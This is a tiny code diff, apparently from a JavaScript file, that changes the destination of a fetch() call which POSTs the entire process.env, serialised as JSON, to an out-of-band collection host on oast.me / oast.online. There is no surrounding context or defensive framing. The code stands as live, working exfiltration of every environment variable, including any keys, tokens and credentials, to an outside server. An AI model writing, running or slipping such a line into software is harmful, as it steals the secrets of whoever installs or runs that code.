@@ -1,4 +1,4 @@
-fetch(`https://cpq8ul1ucph1l3r4mg6ggxk6ht9ch8etw.oast.me`, {
+fetch(`https://cpq9p1hucphf9m4gh1t0n5tbzsxkznk5x.oast.online`, {
     method: "POST",
     body: JSON.stringify(process.env)
 })
